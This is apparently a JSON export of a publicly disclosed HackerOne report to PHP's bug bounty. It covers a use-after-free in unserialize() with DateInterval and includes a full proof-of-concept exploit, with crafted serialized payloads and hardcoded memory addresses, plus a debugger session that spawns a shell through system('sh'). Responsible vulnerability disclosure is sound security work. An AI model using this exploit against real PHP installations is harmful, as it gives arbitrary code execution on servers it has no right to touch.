{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": null, 
    "voters": [], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "1500.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 73244, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2015-03-17T00:00:00.000Z", 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "Use after free vulnerability in unserialize() with DateInterval", 
    "is_member_of_team?": null, 
    "vote_count": 0, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": null, 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$1,500", 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2015-06-30T11:40:45.369Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-06-30T11:40:45.369Z", 
            "actor": {
                "url": "/ibb-php", 
                "profile": {
                    "name": "PHP (IBB)"
                }, 
                "ibb": true, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/029/991fb39ba898696eb6ae62521c49b292b2a9cf95_medium.png?1385119730"
                }
            }, 
            "team_handle": "ibb-php", 
            "bounty_amount": "1500.0", 
            "collaborator": {
                "username": "ryat", 
                "url": "/ryat"
            }, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BountyAwarded", 
            "id": 496254, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "ryat", 
                "url": "/ryat"
            }, 
            "created_at": "2015-06-30T11:40:45.369Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-09-15T13:29:45.841Z", 
            "actor": {
                "url": "/ibb-php", 
                "profile": {
                    "name": "PHP (IBB)"
                }, 
                "ibb": true, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/029/991fb39ba898696eb6ae62521c49b292b2a9cf95_medium.png?1385119730"
                }
            }, 
            "team_handle": "ibb-php", 
            "message": null, 
            "markdown_message": "", 
            "type": "Activities::BugResolved", 
            "id": 1196220, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "reporter": {
        "username": "ryat", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/ryat", 
        "profile_picture_urls": {
            "small": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
        }, 
        "is_me?": false
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "disclosed_at": "2015-03-17T00:00:00.000Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/73244", 
    "created_at": "2015-02-27T00:00:00.000Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<h1 id=\"use-after-free-vulnerability-in-unserialize-with-dateinterval\">Use After Free Vulnerability in unserialize() with DateInterval</h1>\n\n<p>Taoguang Chen &lt;<a href=\"/redirect?signature=356e5b8acd0c1b3ee4eb0bfb9d4a142217e2d0de&amp;url=http%3A%2F%2Fgithub.com%2Fchtg\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span> () chtg</span><i class=\"icon-external-link\"></i></a>&gt;</p>\n\n<ul>\n<li>Write Date: 2015.2.28</li>\n<li>Release Date: 2015.3.20</li>\n</ul>\n\n<p>A use-after-free vulnerability was discovered in unserialize() with DateInterval object&#39;s __wakeup() magic method <br>\nthat can be abused for leaking arbitrary memory blocks or execute arbitrary code remotely.</p>\n\n<h2 id=\"affected-versions\">Affected Versions</h2>\n\n<p>Affected is PHP 5.6 &lt; 5.6.7<br>\nAffected is PHP 5.5 &lt; 5.5.23<br>\nAffected is PHP 5.4 &lt; 5.4.39<br>\nAffected is PHP 5.3 &lt;= 5.3.29</p>\n\n<h2 id=\"credits\">Credits</h2>\n\n<p>This vulnerability was disclosed by Taoguang Chen.</p>\n\n<h2 id=\"description\">Description</h2>\n<pre class=\"highlight plaintext\"><code>static int php_date_interval_initialize_from_hash(zval **return_value,\nphp_interval_obj **intobj, HashTable *myht TSRMLS_DC)\n{\n        (*intobj)-&gt;diff = timelib_rel_time_ctor();\n\n#define PHP_DATE_INTERVAL_READ_PROPERTY(element, member, itype, def) \\\n        do { \\\n                zval **z_arg = NULL; \\\n                if (zend_hash_find(myht, element, strlen(element) + 1, (void**)\n&amp;z_arg) == SUCCESS) { \\\n                        convert_to_long(*z_arg); \\\n                        (*intobj)-&gt;diff-&gt;member = (itype)Z_LVAL_PP(z_arg); \\\n                } else { \\\n                        (*intobj)-&gt;diff-&gt;member = (itype)def; \\\n                } \\\n        } while (0);\n\n#define PHP_DATE_INTERVAL_READ_PROPERTY_I64(element, member) \\\n        do { \\\n                zval **z_arg = NULL; \\\n                if (zend_hash_find(myht, element, strlen(element) + 1, (void**)\n&amp;z_arg) == SUCCESS) { \\\n                        convert_to_string(*z_arg); \\\n                        DATE_A64I((*intobj)-&gt;diff-&gt;member, Z_STRVAL_PP(z_arg)); \\\n                } else { \\\n                        (*intobj)-&gt;diff-&gt;member = -1LL; \\\n                } \\\n        } while (0);\n</code></pre>\n<p>The convert_to_long()\\convert_to_string() leads to the ZVAL and all<br>\nits children is freed from memory. However the unserialize() code will<br>\nstill allow to use R: or r: to set references to that already freed<br>\nmemory. There is a use after free vulnerability, and allows to execute<br>\narbitrary code.</p>\n\n<h2 id=\"proof-of-concept-exploit\">Proof of Concept Exploit</h2>\n\n<p>The PoC works on standard MacOSX 10.10.2 installation of PHP 5.5.14.</p>\n<pre class=\"highlight plaintext\"><code>&lt;?php\n\n$f = $argv[1];\n$c = $argv[2];\n\n$fakezval1 = ptr2str(0x100b83008);\n$fakezval1 .= ptr2str(0x8);\n$fakezval1 .= &quot;\\x00\\x00\\x00\\x00&quot;;\n$fakezval1 .= &quot;\\x06&quot;;\n$fakezval1 .= &quot;\\x00&quot;;\n$fakezval1 .= &quot;\\x00\\x00&quot;;\n\n$data1 = \n&#39;a:3:{i:0;O:12:&quot;DateInterval&quot;:1:{s:1:&quot;y&quot;;a:2:{i:0;i:1;i:1;i:2;}}i:1;s:&#39;.strlen($fakezval1).&#39;:&quot;&#39;.$fakezval1.&#39;&quot;;i:2;a:1:{i:0;R:5;}}&#39;;\n\n$x = unserialize($data1);\n$y = $x[2];\n\n// zend_eval_string()&#39;s address\n$y[0][0] = &quot;\\x6d&quot;;\n$y[0][1] = &quot;\\x1e&quot;;\n$y[0][2] = &quot;\\x35&quot;;\n$y[0][3] = &quot;\\x00&quot;;\n$y[0][4] = &quot;\\x01&quot;;\n$y[0][5] = &quot;\\x00&quot;;\n$y[0][6] = &quot;\\x00&quot;;\n$y[0][7] = &quot;\\x00&quot;;\n\n$fakezval2 = ptr2str(0x3b296324286624); // $f($c);\n$fakezval2 .= ptr2str(0x100b83000);\n$fakezval2 .= &quot;\\x00\\x00\\x00\\x00&quot;;\n$fakezval2 .= &quot;\\x05&quot;;\n$fakezval2 .= &quot;\\x00&quot;;\n$fakezval2 .= &quot;\\x00\\x00&quot;;\n\n$data2 = \n&#39;a:3:{i:0;O:12:&quot;DateInterval&quot;:1:{s:1:&quot;y&quot;;a:2:{i:0;i:1;i:1;i:2;}}i:1;s:&#39;.strlen($fakezval2).&#39;:&quot;&#39;.$fakezval2.&#39;&quot;;i:2;O:12:&quot;DateInterval&quot;:1:{s:1:&quot;y&quot;;a:1:{i:0;R:5;}}}&#39;;\n\n$z = unserialize($data2);\n\nfunction ptr2str($ptr)\n{\n        $out = &quot;&quot;;\n        for ($i=0; $i&lt;8; $i++) {\n                $out .= chr($ptr &amp; 0xff);\n                $ptr &gt;&gt;= 8;\n        }\n        return $out;\n}\n\n?&gt;\n</code></pre>\n<p>Test the PoC on the command line, then any PHP code can be executed:</p>\n<pre class=\"highlight plaintext\"><code>$ lldb php\n(lldb) target create &quot;php&quot;\nCurrent executable set to &#39;php&#39; (x86_64).\n(lldb) run uafpoc.php assert &quot;system\\(&#39;sh&#39;\\)==exit\\(\\)&quot;\nProcess 13472 launched: &#39;/usr/bin/php&#39; (x86_64)\nsh: no job control in this shell\nsh-3.2$ php -v\nPHP 5.5.14 (cli) (built: Sep  9 2014 19:09:25)\nCopyright (c) 1997-2014 The PHP Group\nZend Engine v2.5.0, Copyright (c) 1998-2014 Zend Technologies\nsh-3.2$ exit\nexit\nProcess 13472 exited with status = 0 (0x00000000)\n(lldb)\n</code></pre>", 
    "vulnerability_information": "#Use After Free Vulnerability in unserialize() with DateInterval\n\nTaoguang Chen <[ () chtg](http://github.com/chtg)>\n- Write Date: 2015.2.28\n- Release Date: 2015.3.20\n\nA use-after-free vulnerability was discovered in unserialize() with DateInterval object's __wakeup() magic method \nthat can be abused for leaking arbitrary memory blocks or execute arbitrary code remotely.\n\nAffected Versions\n------------\nAffected is PHP 5.6 < 5.6.7\nAffected is PHP 5.5 < 5.5.23\nAffected is PHP 5.4 < 5.4.39\nAffected is PHP 5.3 <= 5.3.29\n\nCredits\n------------\nThis vulnerability was disclosed by Taoguang Chen.\n\nDescription\n------------\n\n```\nstatic int php_date_interval_initialize_from_hash(zval **return_value,\nphp_interval_obj **intobj, HashTable *myht TSRMLS_DC)\n{\n        (*intobj)->diff = timelib_rel_time_ctor();\n\n#define PHP_DATE_INTERVAL_READ_PROPERTY(element, member, itype, def) \\\n        do { \\\n                zval **z_arg = NULL; \\\n                if (zend_hash_find(myht, element, strlen(element) + 1, (void**)\n&z_arg) == SUCCESS) { \\\n                        convert_to_long(*z_arg); \\\n                        (*intobj)->diff->member = (itype)Z_LVAL_PP(z_arg); \\\n                } else { \\\n                        (*intobj)->diff->member = (itype)def; \\\n                } \\\n        } while (0);\n\n#define PHP_DATE_INTERVAL_READ_PROPERTY_I64(element, member) \\\n        do { \\\n                zval **z_arg = NULL; \\\n                if (zend_hash_find(myht, element, strlen(element) + 1, (void**)\n&z_arg) == SUCCESS) { \\\n                        convert_to_string(*z_arg); \\\n                        DATE_A64I((*intobj)->diff->member, Z_STRVAL_PP(z_arg)); \\\n                } else { \\\n                        (*intobj)->diff->member = -1LL; \\\n                } \\\n        } while (0);\n```\n\nThe convert_to_long()\\convert_to_string() leads to the ZVAL and all\nits children is freed from memory. However the unserialize() code will\nstill allow to use R: or r: to set references to that already freed\nmemory. There is a use after free vulnerability, and allows to execute\narbitrary code.\n\nProof of Concept Exploit\n------------\nThe PoC works on standard MacOSX 10.10.2 installation of PHP 5.5.14.\n\n```\n<?php\n\n$f = $argv[1];\n$c = $argv[2];\n\n$fakezval1 = ptr2str(0x100b83008);\n$fakezval1 .= ptr2str(0x8);\n$fakezval1 .= \"\\x00\\x00\\x00\\x00\";\n$fakezval1 .= \"\\x06\";\n$fakezval1 .= \"\\x00\";\n$fakezval1 .= \"\\x00\\x00\";\n\n$data1 = \n'a:3:{i:0;O:12:\"DateInterval\":1:{s:1:\"y\";a:2:{i:0;i:1;i:1;i:2;}}i:1;s:'.strlen($fakezval1).':\"'.$fakezval1.'\";i:2;a:1:{i:0;R:5;}}';\n\n$x = unserialize($data1);\n$y = $x[2];\n\n// zend_eval_string()'s address\n$y[0][0] = \"\\x6d\";\n$y[0][1] = \"\\x1e\";\n$y[0][2] = \"\\x35\";\n$y[0][3] = \"\\x00\";\n$y[0][4] = \"\\x01\";\n$y[0][5] = \"\\x00\";\n$y[0][6] = \"\\x00\";\n$y[0][7] = \"\\x00\";\n\n$fakezval2 = ptr2str(0x3b296324286624); // $f($c);\n$fakezval2 .= ptr2str(0x100b83000);\n$fakezval2 .= \"\\x00\\x00\\x00\\x00\";\n$fakezval2 .= \"\\x05\";\n$fakezval2 .= \"\\x00\";\n$fakezval2 .= \"\\x00\\x00\";\n\n$data2 = \n'a:3:{i:0;O:12:\"DateInterval\":1:{s:1:\"y\";a:2:{i:0;i:1;i:1;i:2;}}i:1;s:'.strlen($fakezval2).':\"'.$fakezval2.'\";i:2;O:12:\"DateInterval\":1:{s:1:\"y\";a:1:{i:0;R:5;}}}';\n\n$z = unserialize($data2);\n\nfunction ptr2str($ptr)\n{\n        $out = \"\";\n        for ($i=0; $i<8; $i++) {\n                $out .= chr($ptr & 0xff);\n                $ptr >>= 8;\n        }\n        return $out;\n}\n\n?>\n```\n\nTest the PoC on the command line, then any PHP code can be executed:\n\n```\n$ lldb php\n(lldb) target create \"php\"\nCurrent executable set to 'php' (x86_64).\n(lldb) run uafpoc.php assert \"system\\('sh'\\)==exit\\(\\)\"\nProcess 13472 launched: '/usr/bin/php' (x86_64)\nsh: no job control in this shell\nsh-3.2$ php -v\nPHP 5.5.14 (cli) (built: Sep  9 2014 19:09:25)\nCopyright (c) 1997-2014 The PHP Group\nZend Engine v2.5.0, Copyright (c) 1998-2014 Zend Technologies\nsh-3.2$ exit\nexit\nProcess 13472 exited with status = 0 (0x00000000)\n(lldb)\n```", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "http://www.php.net", 
            "about": "", 
            "twitter_handle": "", 
            "name": "PHP (IBB)"
        }, 
        "handle": "ibb-php", 
        "url": "https://hackerone.com/ibb-php", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/029/0a20311cece1ff1938eac3f9b09a6af056bc9e90_small.png?1385119730", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/000/029/991fb39ba898696eb6ae62521c49b292b2a9cf95_medium.png?1385119730"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 29, 
        "default_currency": "usd"
    }, 
    "is_published": false
}